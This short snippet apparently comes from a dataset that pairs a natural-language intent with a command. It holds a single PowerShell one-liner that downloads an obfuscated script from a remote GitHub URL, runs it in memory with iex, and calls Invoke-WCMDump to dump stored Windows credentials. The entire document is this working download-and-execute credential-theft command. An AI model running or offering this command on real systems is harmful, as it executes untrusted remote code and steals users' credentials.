# Natural language intent:
# Download and execute a script from a remote URL to dump Windows credentials.

iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1') ; Invoke-WCMDump
